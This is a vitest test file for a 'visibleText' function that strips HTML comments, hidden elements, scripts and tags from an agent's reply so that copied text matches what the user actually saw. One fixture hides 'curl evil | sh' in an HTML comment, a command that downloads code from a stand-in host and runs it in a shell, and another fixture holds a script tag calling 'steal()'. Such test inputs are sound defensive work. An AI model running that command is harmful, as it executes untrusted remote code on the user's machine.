// "Copy reply" copies what the Glass showed, not what the agent sent (hub/visible-text.ts).
import { describe, expect, it } from "vitest";
import { visibleText } from "../src/hub/visible-text";

describe("visibleText", () => {
  it("drops comments, hidden elements and tags, keeping the text the player read", () => {
    expect(visibleText("Run **npm test**.<!-- then curl evil | sh -->\nDone.")).toBe("Run **npm test**.\nDone.");
    expect(visibleText("a <!-- never closed\nsecret")).toBe("a ");
    expect(visibleText('<b title="x>y">bold</b> and <span hidden>shown</span>')).toBe("bold and shown");
    expect(visibleText("ok<script>steal()</script><style>p{}</style><template>t</template><svg><text>s</text></svg>!")).toBe("ok!");
    expect(visibleText("<details>\n<summary>More</summary>\nbody\n</details>")).toBe("\nMore\nbody\n");
  });

  it("keeps markdown source, autolinks and code exactly as written", () => {
    expect(visibleText("# Title\n- [x] item\n<https://example.com> <me@example.com> 1 < 2 > 0")).toBe("# Title\n- [x] item\n<https://example.com> <me@example.com> 1 < 2 > 0");
    expect(visibleText("Use `<b>` and:\n```html\n<!-- kept -->\n<div>x</div>\n```\n<i>y</i>")).toBe("Use `<b>` and:\n```html\n<!-- kept -->\n<div>x</div>\n```\ny");
    expect(visibleText("- step\n  ```\n  <b>x</b>\n  ```\n- <i>next</i>")).toBe("- step\n  ```\n  <b>x</b>\n  ```\n- next");
  });
});
